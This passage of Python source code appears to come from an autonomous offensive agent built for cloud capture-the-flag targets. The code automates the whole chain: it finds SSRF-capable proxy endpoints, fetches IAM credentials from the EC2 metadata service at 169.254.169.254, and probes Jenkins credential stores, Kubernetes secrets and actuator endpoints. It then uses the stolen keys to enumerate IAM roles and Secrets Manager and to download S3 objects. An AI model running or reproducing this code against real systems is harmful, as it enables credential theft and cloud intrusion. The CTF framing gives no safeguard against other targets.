            self._executed_commands.add(self._normalize_cmd(cmd))
            self._add_to_execution_history(cmd, result)
            if result["success"]:
                self._parse_output(cmd, result)
                stdout = result.get("stdout", "")
                if url.endswith(".js") or ".js?" in url:
                    logger.info(f"     📜 JS analyzed ({len(stdout)} bytes)")

            from urllib.parse import urlparse as _up
            _host = _up(url).hostname or ""
            if _host and _host in self.state.get("cloud_artifacts", {}).get("s3_buckets", []):
                self._probe_s3_bucket(
                    _host, "--no-sign-request", task_name, task_phase,
                    round_num, task_results,
                )

            followed += 1

        return task_results

    def _probe_s3_bucket(
        self, bucket: str, sign_flag: str,
        task_name: str, task_phase: str, round_num: int,
        task_results: List[Dict[str, Any]],
    ) -> None:
        """Probe an S3 bucket with region retry on NoSuchBucket."""
        regions = self.state.get("cloud_artifacts", {}).get("regions", [])
        region = regions[0] if regions else ""
        region_flag = f" --region {region}" if region else ""

        s3_cmd = f"aws s3 ls s3://{bucket}/{region_flag} {sign_flag}".strip()
        s3_cmd = re.sub(r"\s{2,}", " ", s3_cmd)
        if self._normalize_cmd(s3_cmd) in self._executed_commands:
            return

        logger.info(f"     🪣 AUTO-PROBE S3 bucket: {bucket}")
        s3_result = self.executor.run(s3_cmd)
        s3_result.update({"task": task_name, "phase": task_phase,
                          "round": round_num, "timestamp": datetime.now().isoformat()})
        self.execution_log.append(s3_result)
        task_results.append(s3_result)
        self._executed_commands.add(self._normalize_cmd(s3_cmd))
        self._add_to_execution_history(s3_cmd, s3_result)

        combined_out = s3_result.get("stderr", "") + s3_result.get("stdout", "")

        if s3_result["success"] and not self._is_false_positive_success(s3_result):
            self._parse_output(s3_cmd, s3_result)
            logger.info(f"     🪣 S3 bucket accessible! ({len(s3_result.get('stdout', ''))} bytes)")
            self._auto_s3_download_interesting(
                bucket=bucket,
                s3_ls_stdout=s3_result.get("stdout", ""),
                sign_flag=sign_flag,
                task_name=task_name,
                task_phase=task_phase,
                round_num=round_num,
            )
        elif "AccessDenied" in combined_out:
            finding = f"S3 bucket exists (needs auth): {bucket}"
            if finding not in self.state["findings"]:
                self.state["findings"].append(finding)
                logger.info(f"     🪣 {finding}")
        elif "NoSuchBucket" in combined_out and not region_flag:
            for fallback_region in ("us-west-2", "us-east-1", "eu-west-1"):
                retry_cmd = f"aws s3 ls s3://{bucket}/ --region {fallback_region} {sign_flag}"
                retry_cmd = re.sub(r"\s{2,}", " ", retry_cmd)
                if self._normalize_cmd(retry_cmd) in self._executed_commands:
                    continue
                logger.info(f"     🪣 Retry S3 with --region {fallback_region}")
                retry = self.executor.run(retry_cmd)
                self._executed_commands.add(self._normalize_cmd(retry_cmd))
                retry_out = retry.get("stderr", "") + retry.get("stdout", "")
                if retry["success"] and "NoSuchBucket" not in retry_out and "AccessDenied" not in retry_out:
                    self._parse_output(retry_cmd, retry)
                    logger.info(f"     🪣 S3 bucket found in {fallback_region}!")
                    if fallback_region not in self.state.get("cloud_artifacts", {}).get("regions", []):
                        self.state.setdefault("cloud_artifacts", {}).setdefault("regions", []).append(fallback_region)
                    self._auto_s3_download_interesting(
                        bucket=bucket,
                        s3_ls_stdout=retry.get("stdout", ""),
                        sign_flag=sign_flag,
                        task_name=task_name,
                        task_phase=task_phase,
                        round_num=round_num,
                    )
                    break
                if "AccessDenied" in retry_out:
                    finding = f"S3 bucket exists in {fallback_region} (needs auth): {bucket}"
                    if finding not in self.state["findings"]:
                        self.state["findings"].append(finding)
                    break

    def _auto_discover_endpoints(self, target_url: str, task_name: str,
                                  task_phase: str, round_num: int) -> None:
        """Auto-discover API endpoints from root page and probe them for credentials."""
        if getattr(self, '_auto_discovery_done', False):
            return
        self._auto_discovery_done = True

        try:
            root_result = self.executor.run(f"curl -s -k '{target_url}/' 2>/dev/null")
            root_body = root_result.get("stdout", "")
            if not root_body:
                return

            follow_up_commands = []

            href_pattern = re.compile(r'href="(/[^"]*)"', re.IGNORECASE)
            for m in href_pattern.finditer(root_body):
                path = m.group(1)
                if path not in self.state.get("web_endpoints", []):
                    self.state.setdefault("web_endpoints", []).append(path)

            body_lower = root_body.lower()
            service_type = "unknown"
            if "jenkins" in body_lower:
                service_type = "jenkins"
                follow_up_commands.extend([
                    f"curl -s -k '{target_url}/api/json'",
                    f"curl -s -k '{target_url}/credentials/store/system/domain/_/api/json'",
                    f"curl -s -k '{target_url}/script'",
                ])
            if "azure" in body_lower or "microsoft" in body_lower:
                service_type = "azure"
                follow_up_commands.extend([
                    f"curl -s -k '{target_url}/api/admin/config'",
                    f"curl -s -k '{target_url}/api/settings'",
                    f"curl -s -k '{target_url}/api/host/keys'",
                    f"curl -s -k '{target_url}/api/deploymentcredentials'",
                    f"curl -s -k '{target_url}/_apis'",
                ])
            if any(kw in body_lower for kw in ["aws", "amazon", "lambda", "s3"]):
                service_type = "aws"
                follow_up_commands.extend([
                    f"curl -s -k '{target_url}/api/auth/config'",
                    f"curl -s -k '{target_url}/api/auth/tokens'",
                    f"curl -s -k '{target_url}/api/iam/roles'",
                    f"curl -s -k '{target_url}/api/credentials'",
                ])
            if any(kw in body_lower for kw in ["kubernetes", "k8s", "openshift"]):
                service_type = "k8s"
                follow_up_commands.extend([
                    f"curl -s -k '{target_url}/api/v1/namespaces'",
                    f"curl -s -k '{target_url}/api/v1/namespaces/default/secrets'",
                ])
            if any(kw in body_lower for kw in ["grafana", "dashboard"]):
                service_type = "grafana"
            if "actuator" in body_lower or "spring" in body_lower:
                service_type = "spring"
                follow_up_commands.extend([
                    f"curl -s -k '{target_url}/actuator/env'",
                    f"curl -s -k '{target_url}/actuator/configprops'",
                ])

            if service_type != "unknown":
                logger.info(f"     🔍 AUTO-DISCOVERY: Detected service type: {service_type}")
                if service_type not in self.state.get("services_detected", []):
                    self.state.setdefault("services_detected", []).append(service_type)

            api_paths = re.findall(r'"(/api/[^"]{2,50})"', root_body)
            for path in api_paths[:10]:
                clean = path.rstrip("/")
                if clean not in self.state.get("web_endpoints", []):
                    self.state.setdefault("web_endpoints", []).append(clean)
                    follow_up_commands.append(f"curl -s -k '{target_url}{clean}'")

            for cmd in follow_up_commands[:15]:
                norm = self._normalize_cmd(cmd)
                if norm in self._executed_commands:
                    continue
                logger.info(f"     🔍 AUTO$ {cmd[:100]}")
                result = self.executor.run(cmd)
                result["task"] = f"AUTO-DISCOVERY: {task_name}"
                result["phase"] = task_phase
                result["round"] = round_num
                result["timestamp"] = datetime.now().isoformat()
                self.execution_log.append(result)
                self._executed_commands.add(norm)
                if result["success"] and result.get("stdout", "").strip():
                    self._parse_output(cmd, result)
                    stdout = result["stdout"]
                    logger.info(f"     ✅ Discovery hit ({len(stdout)} bytes)")
                    sub_paths = re.findall(r'"(/api/[^"]{2,80})"', stdout)
                    for sp in sub_paths[:5]:
                        sp_clean = sp.rstrip("/")
                        if sp_clean not in self.state.get("web_endpoints", []):
                            self.state.setdefault("web_endpoints", []).append(sp_clean)
        except Exception as e:
            logger.debug(f"Auto-discovery error: {e}")

    def _execute_with_chaining(
        self,
        task: Dict,
        initial_commands: List[str],
        task_name: str,
        task_phase: str,
        round_num: int,
    ) -> Tuple[List[Dict[str, Any]], Dict[str, Any]]:
        """Execute one planner-approved action batch against a tentative state snapshot."""
        commands_to_run = initial_commands[:10]
        task_results: List[Dict[str, Any]] = []
        authoritative_state = self.state
        tentative_state = copy.deepcopy(self.state)
        self.state = tentative_state
        try:
            for cmd in commands_to_run:
                cmd = self._inject_real_credentials(cmd, state_snapshot=authoritative_state)
                cmd = self._fix_region(cmd, state_snapshot=authoritative_state)

                if any(
                    ph in cmd
                    for ph in (
                        "<TOKEN>",
                        "<SECRET>",
                        "<ACCESS_KEY>",
                        "REAL_TOKEN_FROM_STEP1",
                        "REAL_TOKEN_FROM_PREVIOUS_COMMAND",
                        "<SESSION_TOKEN>",
                    )
                ):
                    logger.info(f"     ⏭️ Skipping command with unresolved placeholders: {cmd[:80]}...")
                    continue

                norm = self._normalize_cmd(cmd)
                if norm in self._executed_commands:
                    logger.info(f"     ♻️ Skipping duplicate command: {cmd[:80]}...")
                    continue

                logger.info(f"     $ {cmd[:100]}{'...' if len(cmd) > 100 else ''}")
                result = self.executor.run(cmd)
                result["task"] = task_name
                result["phase"] = task_phase
                result["round"] = round_num
                result["timestamp"] = datetime.now().isoformat()
                self.execution_log.append(result)
                task_results.append(result)
                self._executed_commands.add(norm)
                ok_tag = "ok" if result["success"] else "fail"
                self._commands_run_summary.append(f"[{ok_tag}] {cmd[:80]}")
                if len(self._commands_run_summary) > 100:
                    self._commands_run_summary = self._commands_run_summary[-60:]

                self._add_to_execution_history(cmd, result)
                if result["success"]:
                    stdout = result["stdout"]
                    logger.info(f"     ✅ Success ({len(stdout)} bytes)")
                    if stdout and len(stdout) < 200:
                        logger.info(f"        → {stdout[:150]}")
                else:
                    logger.info(f"     ❌ Failed: {result['stderr'][:100]}")

                self._parse_output(cmd, result, task_context=task)
        finally:
            self.state = authoritative_state

        return task_results, tentative_state

    def _try_get_s3_object(self, bucket_name: str, obj_key: str, cred_prefix: str,
                           target_url: str, task_phase: str, round_num: int):
        """Try to download an S3 object directly. If denied, try presigned URL + SSRF."""
        regions = self.state.get("cloud_artifacts", {}).get("regions", [])
        region = regions[0] if regions else self.state.get("target_info", {}).get("aws_region", "us-east-1")
        get_cmd = f"{cred_prefix} && aws s3 cp s3://{bucket_name}/{obj_key} - --region {region}"
        logger.info(f"     🤖 AUTO$ Getting s3://{bucket_name}/{obj_key}...")
        get_result = self.executor.run(get_cmd)
        get_result["task"] = f"AUTO: Get S3 {obj_key}"
        get_result["phase"] = task_phase
        get_result["round"] = round_num
        get_result["timestamp"] = datetime.now().isoformat()
        self.execution_log.append(get_result)

        if get_result["success"]:
            logger.info(f"     ✅ S3 Object: {get_result['stdout'][:300]}")
            self._parse_output(get_cmd, get_result)
            self.state["exploits_successful"].append(
                {"command": get_cmd, "result": get_result["stdout"][:500]}
            )
            return

        # Direct access failed — try presigned URL + SSRF
        logger.info(f"     ❌ Direct access denied, trying presigned URL + SSRF...")
        presign_cmd = f"{cred_prefix} && aws s3 presign s3://{bucket_name}/{obj_key} --region {region} --expires-in 3600"
        presign_result = self.executor.run(presign_cmd)
        presign_result["task"] = f"AUTO: Presign {obj_key}"
        presign_result["phase"] = task_phase
        presign_result["round"] = round_num
        presign_result["timestamp"] = datetime.now().isoformat()
        self.execution_log.append(presign_result)

        if not (presign_result["success"] and presign_result["stdout"].strip().startswith("https://")):
            logger.info(f"     ❌ Failed to generate presigned URL")
            return

        presigned_url = presign_result["stdout"].strip()
        logger.info(f"     🔗 Presigned URL: {presigned_url[:80]}...")

        if not target_url:
            return

        # Try direct presigned URL via SSRF
        ssrf_cmd = f"curl -s -k '{target_url}/proxy?url={presigned_url}'"
        logger.info(f"     🤖 AUTO$ SSRF with presigned URL...")
        ssrf_result = self.executor.run(ssrf_cmd)
        ssrf_result["task"] = f"AUTO: SSRF Presigned {obj_key}"
        ssrf_result["phase"] = task_phase
        ssrf_result["round"] = round_num
        ssrf_result["timestamp"] = datetime.now().isoformat()
        self.execution_log.append(ssrf_result)

        ssrf_ok = (ssrf_result["success"] and ssrf_result["stdout"].strip()
                   and "418" not in ssrf_result["stdout"]
                   and "I'm a teapot" not in ssrf_result["stdout"]
                   and "403 Forbidden" not in ssrf_result["stdout"]
                   and "401 Unauthorized" not in ssrf_result["stdout"]
                   and "HTTP error:" not in ssrf_result["stdout"])

        if not ssrf_ok:
            # Try URL-encoded version (proxy may reject domain-based URLs)
            try:
                from urllib.parse import quote
                enc_url = quote(presigned_url, safe='')
                ssrf_cmd2 = f"curl -s -k '{target_url}/proxy?url={enc_url}'"
                logger.info(f"     🤖 AUTO$ SSRF with URL-encoded presigned URL...")
                ssrf_result2 = self.executor.run(ssrf_cmd2)
                ssrf_result2["task"] = f"AUTO: SSRF Presigned {obj_key} (encoded)"
                ssrf_result2["phase"] = task_phase
                ssrf_result2["round"] = round_num
                ssrf_result2["timestamp"] = datetime.now().isoformat()
                self.execution_log.append(ssrf_result2)
                enc_out = ssrf_result2.get("stdout", "")
                if (ssrf_result2["success"] and enc_out.strip()
                        and "HTTP error:" not in enc_out
                        and "403 Forbidden" not in enc_out
                        and "401 Unauthorized" not in enc_out
                        and "418" not in enc_out):
                    ssrf_result = ssrf_result2
                    ssrf_ok = True
                else:
                    logger.info(f"     ❌ Encoded SSRF also failed: {enc_out[:200]}")
            except Exception as e:
                logger.debug(f"     Encoded SSRF attempt error: {e}")

        if ssrf_ok:
            logger.info(f"     ✅ SSRF+Presign SUCCESS: {ssrf_result['stdout'][:300]}")
            self._parse_output(ssrf_cmd, ssrf_result)
            self.state["exploits_successful"].append(
                {"command": ssrf_cmd, "result": ssrf_result["stdout"][:500]}
            )
            # Extract flags from successful SSRF result
            extracted = OutputParser.extract_flags(ssrf_result.get("stdout", ""))
            for fl in extracted:
                if fl not in self.state["flags_found"]:
                    self.state["flags_found"].append(fl)
                    self.state["findings"].append(f"🚩 FLAG: {fl}")
                    logger.info(f"     🚩🎯 FLAG CAPTURED: {fl}")
        else:
            logger.info(f"     ❌ SSRF+Presign failed: {ssrf_result.get('stderr', '')[:100]}")

    def _run_auto_ssrf_imdsv2(self, task_name: str, task_phase: str, round_num: int):
        """Run automatic SSRF → IMDSv2/v1 → credential extraction flow.
        Probes endpoint first, validates responses, falls back to IMDSv1."""
        target_url = self.target_url
        if not target_url:
            return

        # If SSRF already confirmed, try to extract working endpoint from vuln data
        ssrf_base = None
        ssrf_vuln = next(
            (v for v in self.state.get("vulnerabilities_found", [])
             if v.get("id") == "ssrf_confirmed"),
            None,
        )
        if ssrf_vuln:
            found_cmd = ssrf_vuln.get("found_in_cmd", "")
            # Extract the SSRF base URL pattern from the confirming command
            for pattern in ["?url=http://169.254", "?target=http://169.254"]:
                if pattern in found_cmd:
                    idx = found_cmd.index(pattern)
                    param_key = pattern.split("=")[0] + "="
                    # Walk backwards to find the full proxy URL start
                    url_start = found_cmd.rfind("'", 0, idx)
                    if url_start == -1:
                        url_start = found_cmd.rfind(" ", 0, idx)
                    url_part = found_cmd[url_start:idx + len(param_key)].strip().strip("'\"")
                    if url_part.startswith("http"):
                        ssrf_base = url_part
                        logger.info(f"\n     🤖 AUTO-SSRF: Reusing confirmed endpoint: {ssrf_base}")
                        break
            if not ssrf_base:
                # Fallback: build from target_url + /proxy?url=
                ssrf_base = f"{target_url}/proxy?url="
                logger.info(f"\n     🤖 AUTO-SSRF: Using default proxy endpoint: {ssrf_base}")

        if not ssrf_base:
            logger.info(f"\n     🤖 AUTO-SSRF: Probing for SSRF-capable endpoints...")
            ssrf_base = self._probe_ssrf_endpoint(target_url)

        if not ssrf_base:
            logger.info(f"     ❌ No SSRF-capable endpoint found — skipping AUTO-SSRF")
            return

        def _build_ssrf_url(path: str) -> str:
            if "?url=" in ssrf_base:
                return f"{ssrf_base}{path}"
            if "?target=" in ssrf_base:
                return f"{ssrf_base}{path}"
            return f"{ssrf_base}?url={path}"

        imds_base = "http://169.254.169.254"
        token = None

        # ── Try IMDSv2 first ──
        logger.info(f"     🤖 AUTO-SSRF: Trying IMDSv2 (PUT for token)...")
        put_cmd = (
            f"curl -s -k -X PUT "
            f"-H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "
            f"'{_build_ssrf_url(imds_base + '/latest/api/token')}'"
        )
        token_result = self.executor.run(put_cmd)
        token_result["task"] = "AUTO-SSRF: IMDSv2 token"
        token_result["phase"] = task_phase
        token_result["round"] = round_num
        token_result["timestamp"] = datetime.now().isoformat()
        self.execution_log.append(token_result)
        self._parse_output(put_cmd, token_result)

        token_stdout = token_result.get("stdout", "").strip()
        if token_result["success"] and self._is_valid_imds_response(token_stdout, "token"):
            token = token_stdout
            logger.info(f"     ✅ IMDSv2 Token: {token[:40]}...")
        else:
            logger.info(f"     ⬇️ IMDSv2 token invalid or failed — trying IMDSv1 fallback...")

        # ── IMDSv1 fallback (no token needed) ──
        role_url = f"{imds_base}/latest/meta-data/iam/security-credentials/"
        if token:
            role_cmd = (
                f"curl -s -k -H 'X-aws-ec2-metadata-token: {token}' "
                f"'{_build_ssrf_url(role_url)}'"
            )
        else:
            role_cmd = f"curl -s -k '{_build_ssrf_url(role_url)}'"

        logger.info(f"     🤖 AUTO$ Getting IAM role name{'(v1)' if not token else ''}...")
        role_result = self.executor.run(role_cmd)
        role_result["task"] = "AUTO-SSRF: IAM role"
        role_result["phase"] = task_phase
        role_result["round"] = round_num
        role_result["timestamp"] = datetime.now().isoformat()
        self.execution_log.append(role_result)
        self._parse_output(role_cmd, role_result)

        role_stdout = role_result.get("stdout", "").strip()
        if not role_result["success"] or not self._is_valid_imds_response(role_stdout, "role"):
            logger.info(f"     ❌ IAM role lookup failed (response: {role_stdout[:80]})")
            return

        role_name = role_stdout.split("\n")[0].strip()
        logger.info(f"     ✅ IAM Role: {role_name}")

        # ── Step 3: Get credentials ──
        cred_url = f"{imds_base}/latest/meta-data/iam/security-credentials/{role_name}"
        if token:
            cred_cmd = (
                f"curl -s -k -H 'X-aws-ec2-metadata-token: {token}' "
                f"'{_build_ssrf_url(cred_url)}'"
            )
        else:
            cred_cmd = f"curl -s -k '{_build_ssrf_url(cred_url)}'"
        logger.info(f"     🤖 AUTO$ Extracting credentials for role {role_name}...")
        cred_result = self.executor.run(cred_cmd)
        cred_result["task"] = f"AUTO-SSRF: Credentials"
        cred_result["phase"] = task_phase
        cred_result["round"] = round_num
        cred_result["timestamp"] = datetime.now().isoformat()
        self.execution_log.append(cred_result)
        self._parse_output(cred_cmd, cred_result)

        if cred_result["success"] and cred_result["stdout"].strip():
            stdout = cred_result["stdout"]
            logger.info(f"     ✅ Credential JSON received ({len(stdout)} bytes)")
            # Try JSON parse for credential extraction
            try:
                cred_data = json.loads(stdout)
                ak = cred_data.get("AccessKeyId", "")
                sk = cred_data.get("SecretAccessKey", "")
                st = cred_data.get("Token", "") or cred_data.get("SessionToken", "")
                if ak and sk:
                    self.state["credentials_found"] = {
                        "AWS_ACCESS_KEY_ID": ak,
                        "AWS_SECRET_ACCESS_KEY": sk,
                        "AWS_SESSION_TOKEN": st,
                    }
                    self.executor.update_credentials(self.state["credentials_found"])
                    logger.info(f"     🔑 Credentials extracted: {ak[:8]}...")
                    logger.info(f"     🔑 Session token: {'YES' if st else 'NO'}")

                    # Now run the AWS enumeration automatically
                    self._auto_aws_ran = True
                    self._run_auto_aws_commands(task_name, task_phase, round_num)
            except (json.JSONDecodeError, TypeError) as e:
                logger.info(f"     ⚠️ Failed to parse credential JSON: {e}")
        else:
            logger.info(f"     ❌ Credential extraction failed: {cred_result.get('stderr', '')[:100]}")

    def _run_auto_aws_commands(self, task_name: str, task_phase: str, round_num: int):
        """Run deterministic AWS enumeration commands using extracted credentials."""
        creds = self.state.get("credentials_found", {})
        ak = creds.get("AWS_ACCESS_KEY_ID", "")
        sk = creds.get("AWS_SECRET_ACCESS_KEY", "")
        st = creds.get("AWS_SESSION_TOKEN", "")

        if not ak or not sk:
            return

        # Make sure executor has the credentials
        self.executor.update_credentials(creds)

        logger.info(f"\n     🤖 AUTO: Running AWS enumeration with extracted credentials...")

        # Build credential prefix for export commands
        cred_prefix = f"export AWS_ACCESS_KEY_ID={shlex.quote(ak)} && export AWS_SECRET_ACCESS_KEY={shlex.quote(sk)}"
        if st:
            cred_prefix += f" && export AWS_SESSION_TOKEN={shlex.quote(st)}"

        # Use discovered region; fall back to us-east-1
        regions = self.state.get("cloud_artifacts", {}).get("regions", [])
        region = regions[0] if regions else self.state.get("target_info", {}).get("aws_region", "us-east-1")

        auto_commands = [
            # Step 1: Verify identity
            f"{cred_prefix} && aws sts get-caller-identity",
            # Step 2: List S3 buckets
            f"{cred_prefix} && aws s3 ls",
        ]

        # ─── Auto Web Recon: ALWAYS run first to discover bucket names, endpoints, etc.
        # This must run BEFORE bucket_name lookup so we have /actuator/env data.
        target_url = self.state.get("target_url", "")
        if target_url and not getattr(self, '_auto_recon_ran', False):
            self._auto_recon_ran = True
            logger.info(f"     🤖 AUTO-RECON: Fetching /actuator/env to discover bucket names...")
            recon_endpoints = [
                f"curl -s -k '{target_url}/actuator/env'",
                f"curl -s -k '{target_url}/actuator/mappings'",
            ]
            for recon_cmd in recon_endpoints:
                logger.info(f"     🤖 AUTO$ {recon_cmd[:100]}...")
                recon_result = self.executor.run(recon_cmd)
                recon_result["task"] = "AUTO-RECON: Web Discovery"
                recon_result["phase"] = task_phase
                recon_result["round"] = round_num
                recon_result["timestamp"] = datetime.now().isoformat()
                self.execution_log.append(recon_result)
                self._parse_output(recon_cmd, recon_result)
        # ─── Bucket name lookup: Check findings for real bucket names ───
        # Reject generic/placeholder names that LLMs tend to generate
        PLACEHOLDER_BUCKETS = {"bucket", "test-bucket", "my-bucket", "example-bucket",
                               "mybucket", "testbucket", "s3bucket", "data", "files"}
        bucket_name = None
        # Priority 1: Look for BUCKET= env var pattern (most reliable)
        for finding in self.state.get("findings", []):
            bucket_match = re.search(r"BUCKET[=:]\s*([a-zA-Z0-9._-]{5,})", finding)
            if bucket_match:
                candidate = bucket_match.group(1)
                if candidate.lower() not in PLACEHOLDER_BUCKETS:
                    bucket_name = candidate
                    logger.info(f"     ✅ Found bucket from env: {bucket_name}")
                    break
        # Priority 2: Look for s3:// references (but validate)
        if not bucket_name:
            for finding in self.state.get("findings", []):
                bucket_match = re.search(r"s3://([a-zA-Z0-9._-]{5,})", finding)
                if bucket_match:
                    candidate = bucket_match.group(1)
                    if candidate.lower() not in PLACEHOLDER_BUCKETS and len(candidate) > 5:
                        bucket_name = candidate
                        logger.info(f"     ✅ Found bucket from s3 URI: {bucket_name}")
                        break

        if bucket_name:
            auto_commands.extend([
                f"{cred_prefix} && aws s3 ls s3://{bucket_name}/ --region {region}",
                f"{cred_prefix} && aws s3api get-bucket-policy --bucket {bucket_name} --region {region}",
                f"{cred_prefix} && aws s3 cp s3://{bucket_name}/flag.txt - --region {region}",
                f"{cred_prefix} && aws s3 cp s3://{bucket_name}/private/flag.txt - --region {region}",
                f"{cred_prefix} && aws s3 presign s3://{bucket_name}/flag.txt --region {region} --expires-in 3600",
                f"{cred_prefix} && aws s3 presign s3://{bucket_name}/private/flag.txt --region {region} --expires-in 3600",
            ])

        # ─── Multi-service enumeration (Lambda, ECS, Cognito, IAM, Secrets) ───
        auto_commands.extend([
            f"{cred_prefix} && aws lambda list-functions --region {region} --query 'Functions[].FunctionName' --output json 2>/dev/null || echo 'no-lambda-access'",
            f"{cred_prefix} && aws ecs list-clusters --region {region} --output json 2>/dev/null || echo 'no-ecs-access'",
            f"{cred_prefix} && aws ecs list-task-definitions --region {region} --max-items 10 --output json 2>/dev/null || echo 'no-ecs-taskdef-access'",
            f"{cred_prefix} && aws cognito-identity list-identity-pools --max-results 10 --region {region} --output json 2>/dev/null || echo 'no-cognito-access'",
            f"{cred_prefix} && aws iam list-roles --max-items 30 --query 'Roles[].[RoleName,Arn]' --output json 2>/dev/null || echo 'no-iam-access'",
            f"{cred_prefix} && aws secretsmanager list-secrets --region {region} --max-results 10 --output json 2>/dev/null || echo 'no-secrets-access'",
        ])

        for cmd in auto_commands:
            norm = self._normalize_cmd(cmd)
            if norm in self._executed_commands:
                logger.info(f"     ♻️ AUTO skip duplicate: {cmd[:80]}...")
                continue
            logger.info(f"     🤖 AUTO$ {cmd[:100]}{'...' if len(cmd) > 100 else ''}")
            result = self.executor.run(cmd)
            result["task"] = f"AUTO: {task_name}"
            result["phase"] = task_phase
            result["round"] = round_num
            result["timestamp"] = datetime.now().isoformat()
            self.execution_log.append(result)
            self._executed_commands.add(norm)

            if result["success"]:
                stdout = result["stdout"]
                logger.info(f"     ✅ Success ({len(stdout)} bytes)")
                if stdout:
                    logger.info(f"        → {stdout[:300]}")
                self._parse_output(cmd, result)

                # If we got a presigned URL, try accessing it via SSRF
                if "s3 presign" in cmd and stdout.strip().startswith("https://"):
                    presigned_url = stdout.strip()
                    logger.info(f"     🔗 Got presigned URL, trying SSRF access...")
                    if target_url:
                        # Try direct presigned URL via SSRF
                        ssrf_cmd = f"curl -s -k '{target_url}/proxy?url={presigned_url}'"
                        logger.info(f"     🤖 AUTO$ {ssrf_cmd[:100]}...")
                        ssrf_result = self.executor.run(ssrf_cmd)
                        ssrf_result["task"] = f"AUTO: Presigned URL SSRF"
                        ssrf_result["phase"] = task_phase
                        ssrf_result["round"] = round_num
                        ssrf_result["timestamp"] = datetime.now().isoformat()
                        self.execution_log.append(ssrf_result)

                        # If direct fails (HTTP 418 = domain name rejected), try URL-encoded
                        got_flag = False
                        ssrf_stdout = ssrf_result.get("stdout", "")
                        ssrf_direct_ok = (ssrf_result["success"] and ssrf_stdout.strip()
                                         and "418" not in ssrf_stdout
                                         and "HTTP error:" not in ssrf_stdout
                                         and "403 Forbidden" not in ssrf_stdout
                                         and "401 Unauthorized" not in ssrf_stdout)
                        if ssrf_direct_ok:
                            logger.info(f"     ✅ SSRF Success: {ssrf_stdout[:300]}")
                            self._parse_output(ssrf_cmd, ssrf_result)
                            got_flag = True
                        else:
                            logger.info(f"     ⚠️ Direct SSRF may have failed, trying URL-encoded...")
                            # URL-encode the presigned URL
                            try:
                                from urllib.parse import quote
                                encoded_url = quote(presigned_url, safe='')
                                ssrf_cmd2 = f"curl -s -k '{target_url}/proxy?url={encoded_url}'"
                                logger.info(f"     🤖 AUTO$ URL-encoded SSRF...")
                                ssrf_result2 = self.executor.run(ssrf_cmd2)
                                ssrf_result2["task"] = f"AUTO: Presigned URL SSRF (encoded)"
                                ssrf_result2["phase"] = task_phase
                                ssrf_result2["round"] = round_num
                                ssrf_result2["timestamp"] = datetime.now().isoformat()
                                self.execution_log.append(ssrf_result2)
                                enc_stdout = ssrf_result2.get("stdout", "")
                                enc_ok = (ssrf_result2["success"] and enc_stdout.strip()
                                         and "HTTP error:" not in enc_stdout
                                         and "403 Forbidden" not in enc_stdout
                                         and "401 Unauthorized" not in enc_stdout
                                         and "418" not in enc_stdout)
                                if enc_ok:
                                    logger.info(f"     ✅ Encoded SSRF Success: {enc_stdout[:300]}")
                                    self._parse_output(ssrf_cmd2, ssrf_result2)
                                    ssrf_result = ssrf_result2
                                    got_flag = True
                                else:
                                    logger.info(f"     ❌ Encoded SSRF also failed: {enc_stdout[:200]}")
                            except Exception as e:
                                logger.info(f"     ❌ URL encoding failed: {e}")

                        if got_flag:
                            # Check if we got the flag!
                            stdout_text = ssrf_result.get("stdout", "")
                            if "WIZ" in stdout_text or "CTF" in stdout_text or "flag" in stdout_text.lower():
                                logger.info(f"     🚩 POTENTIAL FLAG: {stdout_text[:200]}")
                                self.state["exploits_successful"].append(
                                    {"command": ssrf_cmd, "result": stdout_text[:500]}
                                )
                                # Extract and store flags properly
                                extracted = OutputParser.extract_flags(stdout_text)
                                for fl in extracted:
                                    if fl not in self.state["flags_found"]:
                                        self.state["flags_found"].append(fl)
                                        self.state["findings"].append(f"🚩 FLAG: {fl}")
                                        logger.info(f"     🚩🎯 FLAG CAPTURED: {fl}")

                # If S3 ls returned objects or prefixes, try to get them
                if "s3 ls" in cmd and stdout:
                    for line in stdout.split("\n"):
                        line = line.strip()
                        if not line:
                            continue
                        # Handle S3 prefixes (directories) — recurse into them
                        if line.startswith("PRE "):
                            prefix = line[4:].strip()
                            if bucket_name and prefix:
                                ls_prefix_cmd = f"{cred_prefix} && aws s3 ls s3://{bucket_name}/{prefix} --region {region}"
                                logger.info(f"     🤖 AUTO$ Listing prefix {prefix}...")
                                ls_prefix_result = self.executor.run(ls_prefix_cmd)
                                ls_prefix_result["task"] = f"AUTO: List S3 prefix {prefix}"
                                ls_prefix_result["phase"] = task_phase
                                ls_prefix_result["round"] = round_num
                                ls_prefix_result["timestamp"] = datetime.now().isoformat()
                                self.execution_log.append(ls_prefix_result)
                                if ls_prefix_result["success"] and ls_prefix_result["stdout"].strip():
                                    logger.info(f"     ✅ Prefix listing: {ls_prefix_result['stdout'][:200]}")
                                    self._parse_output(ls_prefix_cmd, ls_prefix_result)
                                    # Try to download each object in this prefix
                                    for sub_line in ls_prefix_result["stdout"].split("\n"):
                                        sub_line = sub_line.strip()
                                        if sub_line and not sub_line.startswith("PRE "):
                                            sub_parts = sub_line.split()
                                            if len(sub_parts) >= 4:
                                                sub_key = f"{prefix}{sub_parts[-1]}"
                                                self._try_get_s3_object(
                                                    bucket_name, sub_key, cred_prefix,
                                                    target_url, task_phase, round_num
                                                )
                            continue
                        # Handle S3 objects (files)
                        parts = line.split()
                        if len(parts) >= 4:
                            obj_key = parts[-1]
                            if bucket_name:
                                self._try_get_s3_object(
                                    bucket_name, obj_key, cred_prefix,
                                    target_url, task_phase, round_num
                                )
            else:
                logger.info(f"     ❌ Failed: {result['stderr'][:100]}")
                self._parse_output(cmd, result)

    @staticmethod
    def _detect_cloud_providers(target_desc: str) -> List[str]:
        """Auto-detect cloud providers from target description and installed CLIs."""
        providers = []
        desc_lower = target_desc.lower()

        # From target description keywords
        aws_keywords = ["aws", "amazon", "s3", "ec2", "lambda", "iam", "cloudfront",
                        "dynamodb", "rds", "eks", "ecs", "sqs", "sns", "cloudwatch",
                        "secretsmanager", "ssm", "cloudtrail", "guardduty", "akia"]
        azure_keywords = ["azure", "microsoft", "az ", "entra", "keyvault",
                          "blob", "cosmos", "aks", "app service", "function app",
                          "active directory", "aad"]
        gcp_keywords = ["gcp", "google cloud", "gcloud", "gsutil", "bigquery",
                        "gke", "cloud run", "cloud function", "firestore", "spanner",
                        "pubsub", "gcs", "compute engine", "app engine"]

        if any(kw in desc_lower for kw in aws_keywords):
            providers.append("aws")
        if any(kw in desc_lower for kw in azure_keywords):
            providers.append("azure")
        if any(kw in desc_lower for kw in gcp_keywords):
            providers.append("gcp")

